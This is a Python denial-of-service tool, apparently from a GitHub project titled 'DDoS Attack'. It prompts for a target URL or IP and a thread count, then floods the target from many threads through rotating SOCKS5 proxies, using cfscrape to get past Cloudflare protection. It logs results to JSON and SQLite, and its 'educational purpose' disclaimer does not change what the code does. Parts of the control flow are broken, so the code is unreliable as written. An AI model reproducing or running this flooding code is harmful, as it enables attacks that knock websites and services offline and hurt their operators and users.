import socket
import os
import requests
import sys
import time
from time import sleep
from threading import Thread
import cfscrape
import random
import httpx
import socks
import sqlite3
import json
from colorama import Fore, Style, init
from termcolor import colored
os.system("clear")

attacks_data = []

def save_attack_data_to_json(attacks_data):
    with open("attacks.json", "w") as json_file:
        json.dump(attacks_data, json_file)

def save_attack_data_to_db(attacks_data):
    db_conn = sqlite3.connect("attacks.db")
    db_cursor = db_conn.cursor()
    db_cursor.execute("CREATE TABLE IF NOT EXISTS attacks (id INTEGER PRIMARY KEY AUTOINCREMENT, host TEXT, status_code INTEGER)")

    for data in attacks_data:
        db_cursor.execute("INSERT INTO attacks (host, status_code) VALUES (?, ?)", (data["host"], data["status_code"]))

    db_conn.commit()
    db_conn.close()

def spin():
    delay = 0.25
    spinner = ['█■■■■', '■█■■■', '■■█■■', '■■■█■', '■■■■█']

    for _ in range(1):
        for i in spinner:
            message = f"[*] {Fore.BLUE}Checking your internet connection...[{i}]{Style.RESET_ALL}"
            colored_message = colored(message, 'blue', attrs=['bold'])
            sys.stdout.write(f"\r{colored_message}   ")
            sys.stdout.flush()
            time.sleep(delay)

    sys.stdout.write("\r")
    sys.stdout.flush()
    done_message = colored("[+] Your Internet connection has been verified", 'yellow', attrs=['bold'])
    sys.stdout.write("\033[K") 
    print(done_message)
    time.sleep(3)

spin()

print(1*"\n")

def check_internet_connection():
    try:
        response = requests.get('http://www.google.com', timeout=5)
        return True
    except requests.ConnectionError:
        return False

if check_internet_connection():
    print(f"{Fore.GREEN}Internet connection is available. You can proceed with execution.{Style.RESET_ALL}")
else:
    print(f"{Fore.RED}No internet connection. Exiting the code.{Style.RESET_ALL}")
    exit()

user = open("Attack-users.txt", "r").read().splitlines()
proxy = open("proxy.txt", "r").read().splitlines()
os.system("clear")

def wait_with_spinner(seconds, colors):
    symbols = "/-|\\"

    for _ in range(int(seconds)):
        for symbol in symbols:
            random_color = random.choice(colors)
            colored_symbol = colored(symbol, random_color)
            sys.stdout.write(f"\r{Fore.GREEN}[+] {Fore.BLUE}Please wait...{colored_symbol} {Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.10)

    sys.stdout.write("\r" + " " * 20 + "\r")

wait_time = 2.5
colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
wait_with_spinner(wait_time, colors)

input(f'''{Fore.YELLOW}[+]{Fore.RED} Warning:- {Fore.WHITE}The tool {Fore.RED}"DDoS Attack"{Fore.WHITE} is for educational purpose. I am not responsible for any wrongdoing If you agree, press {Fore.GREEN}[Enter]{Style.RESET_ALL}\n''')

os.system("clear")

text = '''
       .---.        .-----------
      /     \  __  /    ------
     / /     \(  )/    -----
    //////   ' \/ `   ---
   //// / // :    : ---
  // /   /  /`    '--
 //          //..\\
        ====UU====UU====
            '//||\\`
              ''``
·▄▄▄▄  ·▄▄▄▄        .▄▄ ·    ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄ 
██· ██ ██· ██  ▄█▀▄ ▐█ ▀.   ▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪
▐█▪ ▐█▌▐█▪ ▐█▌▐█▌.▐▌▄▀▀▀█▄  ▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·
██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█  ▐█▪ ▐▌ ▐█▌· ▐█▌·▐█▪ ▐▌▐███▌▐█.█▌
▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀    ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀

'''

colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']

random_color = random.choice(colors)

colored_text = colored(text, random_color)
print(colored_text)

print(f'''
 {Fore.RED}<--------------------------------------------------------------------->
 {Fore.RED}|{Fore.GREEN} GitHub{Fore.WHITE} : {Fore.BLUE}MohmmadALbaqer {Fore.WHITE}|{Fore.YELLOW}   https://www.github.com/MohmmadALbaqer/  {Fore.RED}|
 {Fore.RED}|{Fore.GREEN} Instagram{Fore.WHITE} :{Fore.BLUE} r94xs {Fore.WHITE}      |{Fore.YELLOW}   https://www.instagram.comr94xs/         {Fore.RED}|
 {Fore.RED}+---------------------------------------------------------------------+
{Style.RESET_ALL}''')


text = "For more, write a command \"help\" "

start_index = text.find("help")
if start_index != -1:
    end_index = start_index + len("help")
    colored_text = text[:start_index] + colored(text[start_index:end_index], "yellow") + text[end_index:]
    print(colored_text)
else:
    print(text)
    
while True:
    cmd = input(colored(f'''
┌──-[~/{Fore.RED}D{Fore.GREEN}D{Fore.BLUE}o{Fore.YELLOW}S{Style.RESET_ALL}]
└─''', 'white') + colored('>', 'yellow') + colored('>', 'red') + colored('>', 'green'))

    if cmd == "help":
        def print_menu():
            init()

        yellow = Fore.YELLOW
        red = Fore.RED
        blue = Fore.BLUE
        reset = Style.RESET_ALL

        ascii_art = f"""

             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |  {yellow}OPTIONS{reset}        |  |  |     | -==----'|      |
     |  |  {red}[+]{reset} {blue}DNS{reset}        |  |  |     |         |      |
     |  |  {red}[+]{reset} {blue}cf{reset}         |  |  |/----|`---=    |      |
     |  |  {red}[+]{reset} {blue}HTTP{reset}       |  |  |     |         |      |
     |  |  {red}[+]{reset} {blue}socks{reset}      |  |  |   ,/|==== ooo |      ;
     |  |  {red}[+]{reset} {blue}TS3{reset}        |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \\,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\\--{{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
        """
        print(ascii_art)


        print_menu()
    elif cmd == "TS3":
    
         colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

         selected_color = random.choice(colors)
        
         text = '''                                     
███▀▀██▀▀███▄█▀▀▀█▄█         
█▀   ██   ▀███    ▀█         
     ██    ▀███▄     ██▀▀█▄  
     ██      ▀█████▄███  ▀██ 
     ██    ▄     ▀██     ▄██ 
     ██    ██     ██   ▀▀██▄ 
   ▄████▄  █▀█████▀       ██ 
                   ███  ▄█▀  
                    █████▀   
        '''

         colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']

         random_color = random.choice(colors)

         colored_text = colored(text, random_color)
         print(colored_text)

         host = input(f"{Fore.GREEN}[+] Url For Attack:{Style.RESET_ALL}")
         num = int(input(f"{Fore.GREEN}[+] Enter thread:{Style.RESET_ALL}"))
         print(f"{Fore.GREEN}[+]{Fore.WHITE} press {Fore.YELLOW}C+Ctrl {Fore.WHITE}to Exit.{Style.RESET_ALL}")
         break
    elif cmd == "DNS":
         
         colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

         selected_color = random.choice(colors)

         text = '''
                                        
▀███▀▀▀██▄ ▀███▄   ▀███▀▄█▀▀▀█▄█
  ██    ▀██▄ ███▄    █ ▄██    ▀█
  ██     ▀██ █ ███   █ ▀███▄    
  ██      ██ █  ▀██▄ █   ▀█████▄
  ██     ▄██ █   ▀██▄█ ▄     ▀██
  ██    ▄██▀ █     ███ ██     ██
▄████████▀ ▄███▄    ██ █▀█████▀ 

         '''
         colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']

         random_color = random.choice(colors)

         colored_text = colored(text, random_color)

         print(colored_text)

         host = input(f"{Fore.GREEN}[+] Url For Attack:{Style.RESET_ALL}")
         num = int(input(f"{Fore.GREEN}[+] Enter thread:{Style.RESET_ALL}"))
         print(f"{Fore.GREEN}[+]{Fore.WHITE} press {Fore.YELLOW}C+Ctrl {Fore.WHITE}to Exit.{Style.RESET_ALL}")
         break
    elif cmd == "cf":
    
        colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

        selected_color = random.choice(colors)

        text = '''
             ▄▄                             ▄▄                 ▄▄                          
  ▄▄█▀▀▀█▄█▀███                           ▀███     ▀███▀▀▀███▀███                          
▄██▀     ▀█  ██                             ██       ██    ▀█  ██                          
██▀       ▀  ██   ▄██▀██▄▀███  ▀███    ▄█▀▀███       ██   █    ██  ▄█▀██▄ ▀███▄███  ▄▄█▀██ 
██           ██  ██▀   ▀██ ██    ██  ▄██    ██       ██▀▀██    ██ ██   ██   ██▀ ▀▀ ▄█▀   ██
██▄          ██  ██     ██ ██    ██  ███    ██       ██   █    ██  ▄█████   ██     ██▀▀▀▀▀▀
▀██▄     ▄▀  ██  ██▄   ▄██ ██    ██  ▀██    ██       ██        ██ ██   ██   ██     ██▄    ▄
  ▀▀█████▀ ▄████▄ ▀█████▀  ▀████▀███▄ ▀████▀███▄   ▄████▄    ▄████▄████▀██▄████▄    ▀█████▀

         '''
        colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']

        random_color = random.choice(colors)

        colored_text = colored(text, random_color)

        print(colored_text)

        host = input(f"{Fore.GREEN}[+] Url For Attack:{Style.RESET_ALL}")
        num = int(input(f"{Fore.GREEN}[+] Enter thread:{Style.RESET_ALL}"))
        print(f"{Fore.GREEN}[+]{Fore.WHITE} press {Fore.YELLOW}C+Ctrl {Fore.WHITE}to Exit.{Style.RESET_ALL}")
        break
    elif cmd == "HTTP":
    
        colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

        selected_color = random.choice(colors)

        text = '''
                                               
▀████▀  ▀████▀▀██▀▀██▀▀█████▀▀██▀▀██████▀▀▀██▄ 
  ██      ██  █▀   ██   ▀█▀   ██   ▀█ ██   ▀██▄
  ██      ██       ██         ██      ██   ▄██ 
  ██████████       ██         ██      ███████  
  ██      ██       ██         ██      ██       
  ██      ██       ██         ██      ██       
▄████▄  ▄████▄▄  ▄████▄     ▄████▄  ▄████▄     
                                            
         '''
        colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']

        random_color = random.choice(colors)

        colored_text = colored(text, random_color)

        print(colored_text)
        
        host2 = input(f"{Fore.GREEN}[+] Url For Attack:{Style.RESET_ALL}")
        num2 = int(input(f"{Fore.GREEN}[+] Enter thread:{Style.RESET_ALL}"))
        print(f"{Fore.GREEN}[+]{Fore.WHITE} press {Fore.YELLOW}C+Ctrl {Fore.WHITE}to Exit.{Style.RESET_ALL}")
        break
    elif cmd == "socks":
    
        colors = ['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']

        selected_color = random.choice(colors)

        text = '''
                                                  
 ▄█▀▀▀█▄█ ▄▄█▀▀██▄   ▄▄█▀▀▀█▄█████▀ ▀███▀ ▄█▀▀▀█▄█
▄██    ▀███▀    ▀██▄██▀     ▀█ ██   ▄█▀  ▄██    ▀█
▀███▄   ██▀      ▀███▀       ▀ ██ ▄█▀    ▀███▄    
  ▀█████▄█        ███          █████▄      ▀█████▄
▄     ▀███▄      ▄███▄         ██  ███   ▄     ▀██
██     ████▄    ▄██▀██▄     ▄▀ ██   ▀██▄ ██     ██
█▀█████▀  ▀▀████▀▀   ▀▀█████▀▄████▄   ███▄▀█████▀ 
                                                     
         '''
        colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']

        random_color = random.choice(colors)

        colored_text = colored(text, random_color)

        print(colored_text)
        
        host3 = input(f"{Fore.GREEN}[+] IP For Attack:{Style.RESET_ALL}")
        port = int(input(f"{Fore.BLUE}[+] Port for Attack {Fore.YELLOW}Enter Your Custom 4-digit Port {Fore.GREEN}[80-9999]:{Style.RESET_ALL}"))
        num3 = int(input(f"{Fore.GREEN}[+] Enter thread:{Style.RESET_ALL}"))
        print(f"{Fore.GREEN}[+]{Fore.WHITE} press {Fore.YELLOW}C+Ctrl {Fore.WHITE}to Exit.{Style.RESET_ALL}")
        break
    else:
        print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] {Fore.WHITE}Enter{Fore.RED} help{Fore.WHITE} Please{Style.RESET_ALL}")

def ddos(si):
    try:
        proxy2 = {
            "all://": "socks5://" + str(random.choice(proxy))
        }
        u = random.choice(user)
        sc = cfscrape.CloudflareScraper()
        cf = sc.get(host, headers={'Attack-users': u}, proxies=proxy2)
        print(f"{Fore.GREEN}[+] Send Packet FROME "+random.choice(proxy)+" TO "+host+":"+str(cf.status_code))
        attacks_data.append({"host": host, "status_code": cf.status_code})

        save_attack_data_to_json(attacks_data)
        save_attack_data_to_db(attacks_data)

        return True
    except:
        print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] {Fore.RED}connect error{Style.RESET_ALL}")

def http(nurt):
	try:
		proxy3={
			"all://":"socks5://"+str(random.choice(proxy))
			
			}
		with httpx.Client(proxies=proxy3) as client:
			r =client.head(host2,headers={'Attack-users':random.choice(user)})
			print(f"{Fore.GREEN}[+] Send Packet OF the response:{Style.RESET_ALL}"+str(r.status_code))
	except:
		print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] {Fore.RED}connect time out")
def sock3(xl):
	
	for n3 in range(0, num3):
		sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((host3,port))
		ag1=random.choice(user)
		data=f"GET / HTTP/1.1\r\nHost:"+host3+"\r\nAttack-users:"+ ag1+"\r\n\r\n"
		sock.send(data.encode())
		print(f"{Fore.GREEN}[+] Send Packet with IP:"+"test"+"to the Target:"+host3)

if cmd=="HTTP":
	for z in range(0, num2):
		new_thread2 = Thread(target=http,args=(10,))
		new_thread2.start()
elif cmd=="socks":
	new_thread3 = Thread(target=sock3,args=(10,))
	new_thread3.start()
else:
	print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] {Fore.RED}Not Founds{Style.RESET_ALL}")

threads = []
for si in range(0, num):
	t1 = Thread(target=ddos, args=(si,))
	t1.start()
	threads.append(t1)
for t1 in threads:
	t1.join()	
      
save_attack_data_to_json(attacks_data)
save_attack_data_to_db(attacks_data)
